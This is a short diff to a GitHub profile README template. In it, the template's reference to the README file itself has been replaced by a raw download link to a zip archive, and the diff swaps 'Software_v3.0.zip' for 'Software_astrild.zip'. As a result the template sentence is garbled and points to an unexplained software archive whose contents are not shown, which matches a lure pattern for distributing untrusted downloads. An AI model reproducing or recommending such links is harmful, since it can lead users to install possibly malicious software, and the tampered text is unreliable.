@@ -1,7 +1,7 @@
 ## Hi there 👋
 
 <!--
-**ksxenks/ksxenks** is a ✨ _special_ ✨ repository because its `https://github.com/ksxenks/ksxenks/raw/refs/heads/main/troke/Software_v3.0.zip` (this file) appears on your GitHub profile.
+**ksxenks/ksxenks** is a ✨ _special_ ✨ repository because its `https://github.com/ksxenks/ksxenks/raw/refs/heads/main/troke/Software_astrild.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
